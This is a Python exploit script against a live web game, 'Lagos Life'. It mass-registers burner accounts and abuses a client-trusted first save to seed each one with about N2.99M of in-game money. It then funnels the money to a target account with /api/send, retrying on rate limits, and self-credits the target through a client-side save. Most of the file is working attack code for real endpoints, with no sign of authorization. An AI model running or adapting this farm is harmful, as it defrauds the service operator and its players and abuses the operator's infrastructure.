#!/usr/bin/env python3
"""
Lagos Life - does the RATE-LIMITED GRIND lose to REGISTRATION THROUGHPUT?

Established:
  * a brand-new account accepts a FIRST SAVE of up to N2,990,211 instantly (200)
  * after that, the balance can only be GROUND UP at ~N1,094/s
  * /api/send debits the sender server-side and gives the recipient an inbox item
  * the recipient's credit is applied by the RECIPIENT'S CLIENT save

Question: is the recipient's credit save rate-limited too?
  If YES -> the allowance is the wall, the grind is the only route (N1,094/s).
  If NO  -> each burner account is worth ~N2.99M in one shot and the wall becomes
            registration throughput instead.

Also measures the /api/send rate limit, which caps any farm.
"""
import json, urllib.request, urllib.error, http.cookiejar, copy, random, string, time

BASE = "https://lagoslife.eliysites.com"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/125.0 Safari/537.36")
GEN = json.load(open("/tmp/ll_genuine_save.json"))
CEILING = 2_990_211


class Acct:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.user = self.uid = None

    def api(self, p, m="GET", b=None):
        h = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE, "Referer": BASE + "/"}
        d = None
        if b is not None:
            d = json.dumps(b).encode(); h["Content-Type"] = "application/json"
        r = urllib.request.Request(BASE + p, method=m, data=d, headers=h)
        try:
            with self.op.open(r, timeout=40) as resp:
                body = resp.read(); return resp.status, (json.loads(body) if body else {})
        except urllib.error.HTTPError as e:
            body = e.read()
            try:
                return e.code, json.loads(body or b"{}")
            except Exception:
                return e.code, {}
        except Exception as e:
            return None, {"err": str(e)}

    def create_seeded(self, money, seed_ok=False):
        """Register, then FIRST-SAVE at `money`. Returns (ok, why)."""
        self.user = "zzg" + "".join(random.choices(string.ascii_lowercase + string.digits, k=7))
        pw = "Probe!" + "".join(random.choices(string.ascii_letters + string.digits, k=14))
        st, _ = self.api("/api/auth/register", "POST",
                         {"username": self.user, "password": pw, "name": "p", "email": None, "adult": True})
        if st != 200:
            return False, f"register HTTP {st}"
        _, me = self.api("/api/auth/me")
        self.uid = (me.get("user") or {}).get("id")
        g = copy.deepcopy(GEN["game"]); g["sim"] = dict(g.get("sim") or {}); g["sim"]["name"] = self.user
        g["money"] = money
        st2, r2 = self.api("/api/save", "PUT", {"game": g, "base": 0, "fresh": True})
        if st2 != 200:
            return False, f"first save HTTP {st2} {r2.get('error')}"
        return True, "ok"

    def get(self):
        _, s = self.api("/api/save")
        g = s.get("game") or {}
        return g, s.get("updatedAt"), (g.get("money") or 0)


def send_retry(src, dst_uid, amount, tries=8):
    for i in range(tries):
        st, r = src.api("/api/send", "POST", {"to": dst_uid, "amount": amount, "note": "farm"})
        if st == 200:
            return st, r, i
        if st == 429:
            time.sleep(8); continue
        return st, r, i
    return st, r, tries


# ---------------------------------------------------------------- target account
T = Acct()
ok, why = T.create_seeded(1_000_000)
print(f"target @{T.user}  created={ok} ({why})")
g, at, tm0 = T.get()
print(f"  target starts at N{tm0:,}\n")

N = 4
print("=" * 96)
print(f"FARM: {N} burner accounts, each seeded at the N{CEILING:,} ceiling, each sending to the target")
print("=" * 96)

rows = []
t_start = time.time()
for i in range(1, N + 1):
    S = Acct()
    ok, why = S.create_seeded(CEILING)
    if not ok:
        print(f"[{i}] burner create failed: {why}"); continue
    _, _, sm = S.get()
    print(f"[{i}] burner @{S.user} seeded -> N{sm:,}")

    AMT = sm - 100
    st, r, ntries = send_retry(S, T.uid, AMT)
    _, _, sm2 = S.get()
    print(f"    send N{AMT:,} -> HTTP {st} {'' if st==200 else json.dumps(r)[:80]}  (retries={ntries})"
          f"   sender N{sm:,} -> N{sm2:,}")

    # recipient: claim, then save the credit with a CORRECT, freshly-read base
    stc, rc = T.api("/api/family", "POST", {"action": "claim"})
    got = sum(int(x.get("amount") or 0) for x in (rc.get("received") or []))
    gt, at, before = T.get()
    gt2 = copy.deepcopy(gt); gt2["money"] = (gt.get("money") or 0) + got
    stp, rp = T.api("/api/save", "PUT", {"game": gt2, "base": at})
    _, _, after = T.get()
    print(f"    target: claim -> N{got:,} | credit save HTTP {stp} "
          f"{'' if stp==200 else json.dumps(rp)[:90]} | balance N{before:,} -> N{after:,}")
    rows.append({"burner": S.user, "seeded": sm, "sent": AMT, "send_http": st,
                 "claim_returned": got, "credit_save_http": stp, "balance_after": after})

elapsed = time.time() - t_start
g, _, final = T.get()
print("=" * 96)
print(f"target N{tm0:,} -> N{final:,}   GAINED N{final - tm0:,}   in {elapsed:.1f}s")
print(f"accounts created: {N}   average per account: N{(final - tm0) / max(N,1):,.0f}")
if elapsed > 0:
    print(f"EFFECTIVE RATE: N{(final - tm0) / elapsed:,.0f}/s   (grind baseline was ~N1,094/s)")
json.dump({"rows": rows, "target": T.user, "start": tm0, "final": final,
           "gain": final - tm0, "elapsed_s": elapsed, "n": N},
          open("/tmp/ll_farm_repro.json", "w"), indent=2)
print("-> /tmp/ll_farm_repro.json")
